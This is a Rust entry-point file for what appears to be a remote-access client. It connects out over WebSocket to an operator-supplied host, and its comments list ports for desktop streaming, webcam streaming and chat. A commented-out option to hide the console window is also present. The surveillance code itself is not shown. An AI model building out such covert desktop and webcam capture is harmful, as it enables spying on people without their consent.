// #![windows_subsystem = "windows"]
// kill twindow

use std::net::TcpStream;
use std::panic;
use std::str::FromStr;

use tungstenite::stream::MaybeTlsStream;
use tungstenite::{connect, WebSocket};

use crate::router::{handle_message, MessageType};
use crate::utils::{SystemInformation, Connection};

mod handlers;
mod router;
mod utils;
pub type Socket = WebSocket<MaybeTlsStream<TcpStream>>;

/* Ports
4040 - Handling one-time messages
4042 - Desktop Streaming
4043 - Webcam Streaming
4044 - Chat
 */


fn main() {
    let args = std::env::args().collect::<Vec<String>>();
	let (ip, port) = (args.get(1).unwrap().to_owned(), u16::from_str(args.get(2).unwrap()).unwrap());
	let connection = Connection::from(ip, port);
    Connection::connect_with_host(connection);
}
